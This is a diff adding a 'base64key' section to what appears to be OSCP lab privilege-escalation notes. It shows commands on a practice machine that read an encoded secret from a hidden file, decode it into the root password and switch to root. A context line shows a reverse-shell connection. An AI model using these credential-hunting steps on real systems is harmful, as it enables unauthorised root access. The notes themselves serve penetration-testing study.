@@ -2895,6 +2895,41 @@ connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
 id
 uid=0(root) gid=0(root) groups=0(root)
 ````
+#### base64key
+![image](https://github.com/xsudoxx/OSCP/assets/127046919/719d4be5-ae0b-45d0-858a-22d2bd5a7ab8)
+
+````
+[marcus@catto ~]$ ls -la
+total 24
+drwx------  6 marcus marcus 201 May 28 22:20 .
+drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
+-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
+-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
+-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
+-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
+-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
+-rwxrwxr-x  1 marcus marcus 194 May 28 22:18 boot_success
+drwx------  4 marcus marcus  39 Nov 25  2020 .config
+drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
+drwx------  3 marcus marcus  69 May 28 22:06 .gnupg
+-rw-------  1 marcus marcus  33 May 28 21:49 local.txt
+drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm
+
+````
+````
+[marcus@catto ~]$ cat .bash
+F2jJDWaNin8pdk93RLzkdOTr60==
+````
+````
+[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
+SortMentionLeast269
+````
+````
+[marcus@catto ~]$ su
+Password: 
+[root@catto marcus]# id
+uid=0(root) gid=0(root) groups=0(root)
+````
 
 ## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
 ````
